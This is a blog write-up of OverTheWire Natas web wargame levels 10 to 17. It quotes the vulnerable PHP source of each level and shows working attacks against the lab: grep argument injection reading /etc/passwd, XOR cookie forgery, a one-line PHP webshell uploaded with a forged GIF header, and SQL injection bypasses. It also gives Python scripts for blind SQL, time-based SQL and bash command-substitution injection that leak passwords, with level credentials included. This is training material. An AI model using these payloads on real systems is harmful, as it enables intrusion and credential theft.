---
layout: "post"
title: "OverTheWire Natas Write-Up (Part 2)"
date: "2020-10-27 06:46:25"
date_gmt: "2020-10-27 06:46:25"
modified: "2020-10-27 06:46:25"
modified_gmt: "2020-10-27 06:46:25"
slug: "overthewire-natas-write-up-part-2"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/10/27/overthewire-natas-write-up-part-2/"
guid: "http://y4y.space/?p=243"
wordpress_id: 243
parent_id: 0
categories: ["Uncategorized"]
---

## Introduction

Natas is a web challenge series from OverTheWire.

https://overthewire.org/wargames/natas/

User needs to get password to advance to next level. The password file is located in `/etc/natas_webpass` directory, only the correspond user can read the current and next level's password.

This write up will show the necessary steps to get password.

## Natas 10

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-16-16-39.png?w=627)

They say they are now filtering characters, let's examine the source code to see what is now blocked.

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Notice the `preg_match` function, now it's looking for `;`, `|`, and `&` characters. If those character are present in the query, it will not execute the command. I staucked at this for a while, then I realized maybe I can `grep` one pattern from multiple files. So I tried `a /etc/passwd`, which will make the query:

```
grep -i a /etc/passwd dictionary.txt
```

And here is the result

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-16-47-51.png?w=793)

Now, let's do the same for the password file. If 'a' does not return anything, then try 'b', 'c'… until the first result is from `/etc/natas_webpass/natas11`.

## Natas 11

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-16-50-43.png?w=638)

Source

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This is getting a bit messy. So there are some fancy functions in this paragraph of code. We notice by default there is a cookie set for us which is `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`

Then the `xor_encrypt` functions takes the key and input text and xor them together. The key value is not given for obvious reasons.

The `loadData` function will do some messy trick. In the first if statement, it checks if the `data` value is in the `cookie` of request. When our user is first visiting this page, this is no cookie and the server has to issue one to us if they choose to. So we can just skip the entire if statement and jump to what comes after. In this case the function just returns the parameter unchanged.

`saveData` function sets the cookie, the value is first encrypted using the `xor_encrypt`, then it's base64 encoded. And this should be the cookie we have now.

Now, let's do some reversing. We have the final cookie, we also have the plaintext value of data. This implies we can get the key by xor them together.

Here are the steps.

First, enter PHP interactive mode with `php -a`. Then let's see what is the value of `json_encode($data)` is.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-17-45-55.png?w=1024)

Now this string will be the plaintext data we have, in the server backend such string is xored with the key and later base64 encoded.

Next is to base64 decode the cookie we were given, that will be the encrypted data. And finally xor them to find out the key.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-17-49-11.png?w=1024)

The output there is the key repeating itself. So it's easy to find the original key: `'qw8J'`. Then we want the `showpassword` field to have the value `'yes'`. Let's change that and encrypt the data

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-17-51-34.png?w=1024)

Change the cookie to this, and the password will be shown.

## Natas 12

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-17-54-28.png?w=662)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The code is a lot, but essentially it's just a file upload service. It takes a file and submit to the server, the server will give it a random name and after uploading, the server tells you where the file is.

The problem in this code is, we can change the file extension. Bacause the extension is written in HTML, though the type is hidden, we can still change that. Let's write a simple PHP webshell.

```
<?php
system($_REQUEST[c']);
?>
```

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-17-59-49.png?w=1024)

See the random file name in the inspector? That's the filename it will be, but luckily, we can change that. Change the extension from jpg to php, and upload the file.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-01-18.png?w=551)

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-02-12.png?w=1024)

That's cool, now we have code execution we can do many things. But for the sake of this wargame, let's just grab the password.

## Natas 13

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-34-56.png?w=654)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The code looks similar except the part it checks the file type…duh. Here is how it's checking file type:

```
exif_imagetype($_FILES['uploadedfile']['tmp_name'])
```

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-37-11.png?w=1024)

All this function does is to check file's signature. Which means any image file would work. The trick here is file magic header, each has its own unique file header so that the operating systems or other softwares can determine what file it is.

For image files, GIF file's magic header is the easiest to reproduce as it's all plain text: `GIF89a;`. Let's add this before our PHP webshell from last level.

```
GIF89a;
<?php
system($_REQUEST[c']);
?>
```

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-41-18.png?w=749)

Amazing, isn't it? Now let's do the same trick and upload this bad boy.

Follow the link, and here is your webshell.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-43-19.png?w=819)

## Natas 14

Ah ha! Sql injection!

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-53-48.png?w=640)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Let's try the most basic authentication bypass.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-55-52.png?w=642)

And here we go. The source code does not filter anything, so by injecting a double quote will break the sql query. The `-- -` means comment in MySQL, so whatever is after this will not be exe

## Natas 15

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-18-57-54.png?w=618)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This time it only checks if a user exists, and there is no way for us to see the query result. But we know, however, if we inject the query and make it false, then "This user doesn't exits" will appear, and vice versa.

With the info above, we can construct a blind injection query to slowly leak the password.

Here is a simple query:

```
SELECT * FROM natas15 WHERE username="natas16" AND password LIKE BINARY "a%"-- -"
```

The `BINARY` clause in MySQL will specify query to be case-sensitive. And the `"%"` will be the wildcard character in MySQL.

By running the script I build, I can slowly leak the password.

```
import requests
import string
import sys

url = 'http://natas15.natas.labs.overthewire.org/index.php'
username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

key = string.ascii_letters + string.digits
known_pass = ''

for i in range(32):
    for c in key:
        query = f'natas16" AND password LIKE BINARY "{known_pass + c}%"-- -'
        data = {
            'username': query
        }
        req = requests.post(url, auth=(username, password), data=data)
        resp = req.content.decode()
        sys.stdout.write(f'\rTrying {known_pass + c}')
        if "This user exists." in resp:
            known_pass += c
            break

sys.stdin.write(f'\nFound password: {known_pass}\n')
```

## Natas 16

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-20-15-57.png?w=668)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

That's a lot of filters, and they even added a quotation mark around the `key` variable. However, in Bash, the quotations also vary. In the double quotation, you can still use some special expressions to execute commands. Backtic(`) is one, there is another :`$(<command>)`. To test if this is true, we can try to use the `sleep` command. Let's sleep for 5 seconds first. It works on my end, so I know it worked. Now I need to figure out a way to leak the password slowly.

We can use the `grep` command in this case, since the password is definitely not in the dictionary, so if we just do `cat password_file`, then it should return nothing as it cannot find a match, other wise it will grep an empty string which is definitely in the dictionary. `grep` also supports regular expression. So here is the sample command:

```
$(grep -E ^a /etc/natas_webpass/natas17)
```

`^` in regular expression means the expression starts with whatever is after it.

An example command:

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-20-34-00.png?w=880)

Like the blind injection last level, let's do the same thing but for bash.

```
import requests
import sys
import string

base_url = 'http://natas16.natas.labs.overthewire.org/index.php'
username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

key = string.ascii_letters + string.digits
known_pass = ''

for i in range(32):
    for c in key:
        query = f'$(grep+-E+^{known_pass + c}+/etc/natas_webpass/natas17)African'
        url = f'{base_url}?needle={query}&submit=Search'
        req = requests.get(url, auth=(username, password))
        resp = req.content.decode()
        sys.stdout.write(f'\rTrying {known_pass + c}')
        if 'African' not in resp:
            known_pass += c
            break

sys.stdout.write(f'\n Found password: {known_pass}')
```

Be sure to run this with Python 3. And I believe I neglected to say, the reason for me to do `for i in range(32)` is because all of the password we recovered so far has the length of 32.
I also added 'African' at the end of the query, that's bash's way to concatenate strings, and since the dictionary file is so huge, it will take a really long time to get a response and process the data. By adding 'African' will greatly reduce the response size then the processing time.

## Natas 17

More injections because why not.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-22-01-16.png?w=645)

Source:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Basic the same code from last time, but this time around no message will be shown. That's just great. Last time we did a blind injection, but this time we can do a time-based injection as the error message is also blocked.

In SQL, not just MySQL, there is some sort of `sleep` functions, we will use this function for our good.

For starters, let's try this:

```
SELECT * FROM natas17 WHERE username="" OR (SELECT 1=1 AND sleep(1))-- -
```

The first half will fail, so it will return the value of second half, which `1=1` will always be true, and the statement (`sleep(1)`) after it will then be executed.

Then our query should look like this:

```
SELECT * FROM natas17 WHERE username="natas18" AND password LIKE BINARY "s%" AND SLEEP(1)-- -
```

For the exploit script, we will have to time the query this time. Because upon a successful query, it will sleep for 1 second. Just to make sure nothing goes wrong, let's do 3 seconds.

```
import requests
import sys
import time
import string

url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

key = string.ascii_letters + string.digits
known_pass = ''

for i in range(32):
    for c in key:
        query = f'natas18" AND password LIKE BINARY "{known_pass + c}%" AND sleep(3)-- -'
        data = {
            'username': query
        }
        start_time = time.time()
        req = requests.post(url, data=data, auth=(username, password))
        resp = req.content.decode()
        end_time = time.time()
        interval = end_time - start_time
        sys.stdout.write(f'\rTrying: {known_pass + c}')
        if interval > 3:
            known_pass += c
            break

sys.stdout.write(f'\nFound Password: {known_pass}\n')
```
